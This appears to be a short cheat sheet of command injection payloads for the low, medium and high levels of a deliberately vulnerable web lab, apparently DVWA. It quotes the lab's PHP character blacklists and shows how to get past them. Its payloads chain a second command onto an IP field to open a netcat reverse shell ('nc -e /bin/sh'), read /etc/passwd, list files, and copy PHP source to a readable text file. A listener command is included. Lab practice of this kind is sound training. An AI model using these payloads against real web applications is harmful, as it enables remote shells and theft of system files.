# Command Injection
##level Low
```bash
nc -l -vv -p 8888 # listen port on 8888
# to web page use: 127.0.0.1 && nc -e /bin/sh 127.0.0.1 8888 
# On this page can be get passwd file content 127.0.0.1;cat /etc/passwd
```

## Medium Level
```bash
# On this level replace "&&" and ";"
# PHP page source:
# $substitutions = array(
#        '&&' => '',
#        ';'  => '',
#    );
# $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
# Can be use "&", "|", "||"
# 127.0.0.1 | ls
# 127.0.0.1 | pwd
# 127.0.0.1 | nc -e /bin/sh 127.0.0.1 888
```

## Highe Level
```bash
# Replace more char on this level
# PHP page source:
# $substitutions = array(
#        '&'  => '',
#        ';'  => '',
#        '| ' => '', //Here have a space after |,so you can use without sapce, like 127.0.0.1|pwd
#        '-'  => '',
#        '$'  => '',
#        '('  => '',
#        ')'  => '',
#        '`'  => '',
#        '||' => '',
#    );
#
#    // Remove any of the charactars in the array (blacklist).
#    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
# On this level after | has space,so you can use without space.
# 127.0.0.0 |pwd
# You can rename or copy php file to txt,the you can use txt file view source code
# |/bin/cp file.php file.txt
```
